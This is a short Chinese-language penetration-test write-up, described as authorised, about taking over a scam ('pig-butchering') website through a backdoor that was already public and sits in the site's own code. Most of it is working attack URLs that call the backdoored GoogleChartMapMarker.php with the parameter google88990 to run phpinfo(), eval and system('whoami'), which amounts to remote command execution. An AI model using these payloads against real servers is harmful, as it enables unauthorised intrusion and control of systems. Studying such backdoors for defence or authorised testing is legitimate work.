# 1\. 说明

本文是很久之前写的，而且是有授权，整个过程很简单。

这个杀猪盘是网上2年前就已经公开的，因为**其程序本身就存在后门。**

`getshell`的时候直接从后门上去就行了。

# 2\. 实战

http://xxx.com

![](../Images/12f61c1e37ea028913541b2e3a0c8843.png)

直接利用后门加上payload：

```
http://xxxx.com/lib/GoogleChartMapMarker.php?google88990=phpinfo();
```

![](../Images/64ef6f6674fefa184d189051c20d8920.png "null")

  

测试之后发现，在这里相当于是一个`shell`了：

```
http://xxxx.com/lib/markers/GoogleChartMapMarker.php?google88990=eval 1;
```

![](../Images/778ee86127092a7cd1f051f7df49ba77.png "null")

  

稍微修改下：

```
http://xxxx0.com/lib/classes/googleChart/markers/GoogleChartMapMarker.php?google88990=system("whoami");
```

![](../Images/43f0695d138361e452b52760f18a116d.png "null")

```

```
